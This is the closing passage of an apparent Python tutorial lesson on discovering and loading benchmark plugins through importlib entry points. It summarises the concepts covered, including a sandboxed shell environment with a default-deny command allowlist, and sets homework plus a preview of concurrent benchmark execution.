assert all(checks.values()), "One or more verification checks failed."
print("\nAll checks passed.")


## Summary

| Concept | One-line takeaway |
|---|---|
| `importlib.metadata.entry_points()` | Standard-library mechanism to read what OTHER installed packages have declared, without importing them |
| `discover_plugins()` vs `load_plugins()` | Read-only metadata probe vs. actually importing (and thereby executing registration side effects in) the target module |
| Entry-point groups | A namespaced string (`"agent_bench.environments"`) that any package can declare against -- the shared contract between core and plugin |
| `ShellEnv` | Terminal-Bench-shaped environment: score the end state of a sandboxed filesystem, not the transcript |
| Default-deny allowlist inside an environment | The L63 tool-permission-gate idea, now applied at the point where an environment executes agent-issued commands |
| Per-plugin failure isolation | `load_plugins()` catches exceptions per entry point so one broken third-party package can't take down the whole harness |
| Plugin name collisions are real, not hypothetical | Demonstrated against two actually-installed distributions, not a simulated dict clash |
| `pip install -e` + `pyproject.toml` entry-points | The complete, real distribution mechanism -- no custom loader, no config file format of your own |

### Homework

1. Add a second tool to `ShellEnv` (e.g. `read_file`) and a task that requires composing two shell calls in sequence.
2. Write a THIRD real plugin package (own `pyproject.toml`, own module) that registers a new **scorer** (not environment) under the `"agent_bench.scorers"` group, and prove `load_plugins("scorers")` picks it up.
3. Add a version constraint (`"agent-bench>=0.1,<0.2"`) to `agent_bench_shell_plugin`'s dependency on `agent-bench`, and explain in a markdown cell what breaks (or doesn't) if you bump core to `0.2.0`.
4. Replace the `_ALLOWED_BINARIES` set with a `RiskTier`-shaped structure (recall L63) so some commands are allowed-with-confirmation instead of just allowed/denied.
5. Try `pip install -e . --force-reinstall` after adding a brand-new entry point to an already-installed package's `pyproject.toml`, without changing any `.py` file -- confirm for yourself that this step (not just editing the code) is what makes a new entry point discoverable.

### Preview: L67 — Performance (async/parallel benchmark execution)

Every `BenchmarkRunner.run()` call so far has executed tasks one at a time. L67 makes it concurrent -- `asyncio.gather` + a semaphore (same shape as L57's `batch_distill()`), so a 50-task suite with real Claude-backed agents doesn't take 50x as long as a 1-task suite.
